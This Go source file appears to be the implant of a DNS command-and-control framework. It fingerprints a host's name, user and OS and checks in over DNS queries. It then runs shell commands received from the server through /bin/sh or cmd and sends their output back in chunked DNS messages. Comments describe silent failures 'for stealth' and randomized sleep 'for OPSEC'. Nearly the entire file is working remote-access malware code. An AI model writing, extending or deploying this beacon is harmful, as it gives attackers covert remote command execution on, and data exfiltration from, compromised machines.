package main

import (
	"crypto/md5"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Beacon represents the DNS beacon client
type Beacon struct {
	client   *DNSClient
	id       string
	hostname string
	username string
	os       string
	arch     string
	running  bool
}

// newBeacon creates a new DNS beacon with embedded configuration
func newBeacon() (*Beacon, error) {
	client := newDNSClient()

	// Generate unique beacon ID
	hostname, _ := os.Hostname()
	beaconID := generateBeaconID(hostname)

	// Get system info
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	if username == "" {
		username = "unknown"
	}

	return &Beacon{
		client:   client,
		id:       beaconID,
		hostname: hostname,
		username: username,
		os:       runtime.GOOS,
		arch:     runtime.GOARCH,
		running:  false,
	}, nil
}

// generateBeaconID creates a unique ID for this beacon
func generateBeaconID(hostname string) string {
	hash := md5.Sum([]byte(hostname + fmt.Sprintf("%d", time.Now().Unix())))
	return fmt.Sprintf("%x", hash)[:4]
}

// checkIn sends a beacon check-in to the DNS server
func (b *Beacon) checkIn() (string, error) {
	// Create check-in message with system info (limit length for DNS)
	shortHostname := b.hostname
	if len(shortHostname) > 10 {
		shortHostname = shortHostname[:10]
	}
	shortUsername := b.username
	if len(shortUsername) > 8 {
		shortUsername = shortUsername[:8]
	}
	shortOS := b.os
	if len(shortOS) > 7 {
		shortOS = shortOS[:7]
	}
	checkInData := fmt.Sprintf("CHK|%s|%s|%s|%s",
		b.id, shortHostname, shortUsername, shortOS)

	// Send check-in via DNS query
	response, err := b.client.sendCommand(checkInData)
	if err != nil {
		return "", fmt.Errorf("check-in failed: %v", err)
	}

	return response, nil
}

// executeCommand runs a system command and returns the output
func (b *Beacon) executeCommand(command string) string {
	var cmd *exec.Cmd

	// Choose appropriate shell based on OS
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", command)
	default:
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
	}

	return string(output)
}

// exfiltrateResult sends command results back via DNS using two-phase protocol
func (b *Beacon) exfiltrateResult(result string, taskID string) error {
	maxCmd := b.client.config.MaxCommandLength
	if maxCmd <= 64 {
		maxCmd = 800 // sensible default for chunked results
	}

	// Conservative estimate for overhead
	overhead := 100
	safeRawChunk := (maxCmd - overhead) / 2
	if safeRawChunk < 8 {
		safeRawChunk = 8 // minimum viable chunk
	}
	if safeRawChunk > 50 {
		safeRawChunk = 50 // conservative max to avoid DNS issues
	}

	if len(result) <= safeRawChunk {
		// Send in single RESULT message
		exfilData := fmt.Sprintf("RESULT|%s|%s|%s", b.id, taskID, result)
		_, err := b.client.sendCommand(exfilData)
		return err
	}

	// Phase 1: Send metadata about the incoming chunked result
	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk

	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)
	_, err := b.client.sendCommand(metaData)
	if err != nil {
		return fmt.Errorf("failed to send result metadata: %v", err)
	}

	// Small delay before starting chunks
	time.Sleep(2 * time.Second)

	// Phase 2: Send the actual data chunks
	for i := 0; i < totalChunks; i++ {
		start := i * safeRawChunk
		end := start + safeRawChunk
		if end > len(result) {
			end = len(result)
		}

		chunk := result[start:end]
		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%s", b.id, taskID, i+1, chunk)
		_, err := b.client.sendCommand(chunkData)
		if err != nil {
			return fmt.Errorf("failed to send data chunk %d/%d: %v", i+1, totalChunks, err)
		}

		// Small delay between chunks
		time.Sleep(time.Duration(rand.Intn(2)+1) * time.Second)
	}

	return nil
}

// parseTask parses a task from the DNS server response
func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool) {
	// Expected format: TASK|taskID|command
	parts := strings.SplitN(response, "|", 3)

	if len(parts) >= 3 && parts[0] == "TASK" {
		return parts[1], parts[2], true
	}

	return "", "", false
}

// runBeacon starts the beacon loop
func (b *Beacon) runBeacon() {
	b.running = true

	// Initial check-in
	_, err := b.checkIn()
	if err != nil {
		// Silent failure for stealth
		return
	}

	// Main beacon loop with randomized sleep intervals
	sleepMin := b.client.config.SleepMin
	sleepMax := b.client.config.SleepMax

	if sleepMin <= 0 {
		sleepMin = 5 // Default minimum 5 seconds
	}
	if sleepMax <= sleepMin {
		sleepMax = sleepMin + 10 // Default maximum
	}

	for b.running {
		// Randomize sleep interval between min and max for OPSEC
		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
		time.Sleep(sleepDuration)

		// Send check-in
		response, err := b.checkIn()
		if err != nil {
			continue // Silent failure for stealth
		}

		// Check if server has a task for us
		taskID, command, isTask := b.parseTask(response)
		if isTask {
			// Execute the command
			result := b.executeCommand(command)

			// Exfiltrate the result
			_ = b.exfiltrateResult(result, taskID)
		}
	}
}

// main function - entry point
func main() {
	// Seed random number generator for randomized sleep intervals
	rand.Seed(time.Now().UnixNano())

	// Create beacon with embedded configuration
	beacon, err := newBeacon()
	if err != nil {
		os.Exit(1) // Silent exit for stealth
	}

	// Handle Ctrl+C gracefully
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		beacon.running = false
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	// Start the beacon
	beacon.runBeacon()
}
